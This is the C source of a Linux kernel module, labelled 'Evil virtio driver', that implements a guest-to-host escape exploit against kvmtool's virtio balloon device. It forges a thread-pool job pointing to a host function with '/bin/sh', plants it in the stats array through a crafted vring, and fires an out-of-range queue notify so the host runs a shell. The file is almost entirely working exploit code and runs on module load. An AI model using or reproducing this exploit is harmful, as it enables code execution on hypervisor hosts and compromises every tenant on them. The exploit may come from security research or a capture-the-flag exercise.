#include <linux/virtio.h>
#include <linux/virtio_ids.h>
#include <linux/virtio_config.h>
#include <linux/module.h>
#include <linux/list.h>

#include <linux/types.h>
#include <linux/virtio_types.h>

#include "virtio_vring.h"
#include "virtio_pci.h"

enum virtio_balloon_vq
{
	VIRTIO_BALLOON_VQ_INFLATE,
	VIRTIO_BALLOON_VQ_DEFLATE,
	VIRTIO_BALLOON_VQ_STATS,
	VIRTIO_BALLOON_VQ_FREE_PAGE,
	VIRTIO_BALLOON_VQ_REPORTING,
	VIRTIO_BALLOON_VQ_MAX
};

typedef void (*kvm_thread_callback_fn_t)(void *kvm, void *data);

// Mirrors struct thread_pool__job struct from kvmtool, with additional 8 bytes for "/bin/sh"
struct thread_pool__job
{
	kvm_thread_callback_fn_t callback; 	// Function pointer: virtio_net_exec_script(char *script, char *tag)	[8 bytes]
	void *kvm;						   	// First argument: pointer to arg_str that holds "/bin/sh" 				[8 bytes]
	void *data;						   	// Second argument: NULL					 							[8 bytes]			

	int signalcount;                   	// Threads already processing job, set to 0 							[4 bytes]
	char padding[4];                    // Alignment padding													[4 bytes]
	char mutex[40];	                    // Job mutex, must start in unlocked state 								[40 bytes]

	struct list_head queue; 			// List entry for job queue, point to ourselves to keep valid			[16 bytes]
	
};		// Overall 88 bytes

struct job_payload {
	struct thread_pool__job job;
	char arg_str[8]; 					// Additional bytes to store "/bin/sh", pointed to by job.kvm			[8 bytes]
};	// Overall 

// Address of: static int virtio_net_exec_script(const char* script, const char *tap_name)
#define NET_EXEC_ADDR (0x410530)

#define BDEV_ADDR (0x052E960)
#define STATS_ARR_OFFSET (0x268)
#define STATS_ARR_SIZE (0x82)

// Create a fake job payload to send to the device, that if executed will launch a shell
static struct job_payload *create_job_payload(void)
{
	const char *path = "/bin/sh";

	// Size will be thread pool job plus 8 bytes for arg string
	struct job_payload *payload = kzalloc(sizeof(struct job_payload), GFP_KERNEL);
	if (!payload)
		return NULL;

	// In host user address space, payload will land at stats_array_base
	uint64_t stats_array_base = BDEV_ADDR + STATS_ARR_OFFSET;

	// Payload will be called with two arguments: payload->kvm (script="/bin/sh") and payload->data (tap_name=NULL)
	payload->job.callback = (kvm_thread_callback_fn_t)NET_EXEC_ADDR;

	// Point to the extra space after the original job pool fields but before end of stats array, where "/bin/sh" is placed
	payload->job.kvm = (void *)stats_array_base + offsetof(struct job_payload, arg_str);
	payload->job.data = NULL;

	// Signalcount must be 0, to indicate that no other threads have executed this job
	payload->job.signalcount = 0;

	// Padding is to match alignment of the original struct
	memset(payload->job.padding, 0, sizeof(payload->job.padding));

	// Mutex must be initially unlocked, filling with zeros works
	memset(payload->job.mutex, 0, sizeof(payload->job.mutex));

	// List entry in the job queue, point to the only valid element we know of, which is itself
	payload->job.queue.next = (struct list_head *)(stats_array_base + offsetof(struct thread_pool__job, queue));
	payload->job.queue.prev = payload->job.queue.next;

	// Write "/bin/sh" into extra space
	strncpy(payload->arg_str, path, 8);

	return payload;
}

// Create a vring for virtio communication with one element, pointing to the given data buffer
// Includes 3 contiguous components: descriptor ring, available ring, and used ring
static struct vring *construct_outgoing_vring(void *data_buff, size_t size)
{

	int QUEUE_SIZE = 1;

	struct vring *vr = kzalloc(sizeof(struct vring), GFP_KERNEL);
	if (!vr)
		return NULL;

	size_t virt_q_offset = 0;
	size_t virt_q_size = virtq_size(QUEUE_SIZE);
	void *virt_q = kzalloc(virt_q_size, GFP_KERNEL);
	if (!virt_q)
		return NULL;

	// Descriptor ring: pointers to actual data in guest physical memory
	struct vring_desc *desc = (struct vring_desc *)(virt_q + virt_q_offset);
	if (!desc)
		return NULL;

	virt_q_offset += desc_size(QUEUE_SIZE);

	desc->addr = virt_to_phys(data_buff); // guest physical address of data buff
	desc->flags = 0;					  // NEXT = 0, WRITE = 0, INDIRECT = 0
	desc->len = size;					  // length of data buff
	desc->next = 0;						  // no next descriptor

	// Available ring: indices of descriptors available to be processed
	struct vring_avail *avail = (struct vring_avail *)(virt_q + virt_q_offset);
	if (!avail)
		return NULL;

	virt_q_offset += avail_size(QUEUE_SIZE);

	avail->flags = 0;	// no flags
	avail->idx = 0;		// index into ring array of next available descriptor
	avail->ring[0] = 0; // index into desc table of first available descriptor
	avail->ring[1] = 0; // event index (not used?)

	// Used ring: indices of descriptors that have been processed
	struct vring_used *used = (struct vring_used *)(virt_q + virt_q_offset);
	if (!used)
		return NULL;
	used->flags = 0;				   // no flags
	used->idx = 0;					   // index into ring array of next used descriptor
	used->ring[0].id = 0;			   // index into desc table of first used descriptor
	used->ring[0].len = size;		   // length of data buff
	*(uint16_t *)(&used->ring[1]) = 0; // avail index (not used?)

	// Save guest kernel pointers to the vring elements
	vr->used = used;
	vr->avail = avail;
	vr->desc = desc;
	vr->num = QUEUE_SIZE;

	return vr;
}

// Given a prepaired vring, send a notification to the host that the stats buffer is ready
static int notify_stats_vring(struct vring *vr)
{
	// Map the PCI MMIO area from guest physical to guest kernel memory
	volatile void *mmio_base = ioremap(KVM_PCI_MMIO_AREA, PAGE_SIZE);
	if (!mmio_base)
	{
		printk(KERN_ERR "[ESCAPEMOD] failed to map PCI MMIO area\n");
		return -1;
	}

	// Access the common config structure within the mapped area
	volatile struct virtio_pci_common_cfg *cfg = (volatile struct virtio_pci_common_cfg *)mmio_base;

	// Reset the stats queue
	cfg->queue_select = VIRTIO_BALLOON_VQ_STATS;
	cfg->queue_enable = 0;

	// Populate config with vring information
	cfg->queue_select = VIRTIO_BALLOON_VQ_STATS;
	cfg->queue_desc_lo = (uint32_t)virt_to_phys(vr->desc);
	cfg->queue_desc_hi = (uint32_t)(virt_to_phys(vr->desc) >> 32);
	cfg->queue_avail_lo = (uint32_t)virt_to_phys(vr->avail);
	cfg->queue_avail_hi = (uint32_t)(virt_to_phys(vr->avail) >> 32);
	cfg->queue_used_lo = (uint32_t)virt_to_phys(vr->used);
	cfg->queue_used_hi = (uint32_t)(virt_to_phys(vr->used) >> 32);

	// Enable queue to pass forward information
	cfg->queue_enable = 1;

	// // Notify host - properly access the notify register through the mapped memory

	// The equivalent of vp_notify (or 'kick' in virtio)
	iowrite16(VIRTIO_BALLOON_VQ_STATS, (void *)mmio_base + VPCI_CFG_NOTIFY_START);

	// Clean up - unmap when done
	iounmap((void *)mmio_base);

	printk(KERN_INFO "[ESCAPEMOD] sent stats buffer\n");
	return 0;
}

static int trigger_escape(void)
{
	// Send PCI write with max vqs + 1

	volatile void *mmio_base = ioremap(KVM_PCI_MMIO_AREA, PAGE_SIZE);
	if (!mmio_base)
	{
		printk(KERN_ERR "[ESCAPEMOD] failed to map PCI MMIO area\n");
		return -1;
	}

	printk_common_config((struct virtio_pci_common_cfg *)mmio_base);

	*(volatile uint16_t *)(mmio_base + VPCI_CFG_NOTIFY_START) = VIRTIO_BALLOON_VQ_STATS + 1;

	iounmap((void *)mmio_base);
	printk(KERN_INFO "[ESCAPEMOD] sent escape\n");
	return 0;
}

static int escape(void)
{
	// trigger_escape();

	// Allocate and create binsh job payload in guest physical memory
	struct job_payload *payload = create_job_payload();
	if (!payload)
	{
		printk(KERN_ERR "[ESCAPEMOD] failed to create job payload\n");
		return -1;
	}

	// Construct a virtio communication vring pointing to the payload, again in guest physical memory
	struct vring *vr = construct_outgoing_vring(payload, sizeof(struct job_payload));
	if (!vr)
	{
		printk(KERN_ERR "[ESCAPEMOD] failed to construct vring\n");
		return -1;
	}

	// Signal the device with a 'stats' mmio notification, so it ingests payload to the stats array
	// in host virtual memory
	if (notify_stats_vring(vr) < 0)
	{
		printk(KERN_ERR "[ESCAPEMOD] failed to notify stats vring\n");
		return -1;
	}

	// Trigger escape by overflowing expected vq number
	if (trigger_escape() < 0)
	{
		printk(KERN_ERR "[ESCAPEMOD] failed to trigger escape\n");
		return -1;
	}
	return 0;
}

static int __init escape_mod_init(void)
{
	printk(KERN_INFO "[ESCAPEMOD] Loading module\n");
	if (escape() < 0)
	{
		printk(KERN_ERR "[ESCAPEMOD] failed to escape\n");
		return -1;
	}
	printk(KERN_INFO "[ESCAPEMOD] Attempted escape\n");
	return 0;
}

static void __exit escape_mod_exit(void)
{
	printk(KERN_INFO "[ESCAPEMOD] Unloading module\n");
}

module_init(escape_mod_init);
module_exit(escape_mod_exit);

MODULE_DESCRIPTION("Evil virtio driver");
MODULE_LICENSE("GPL");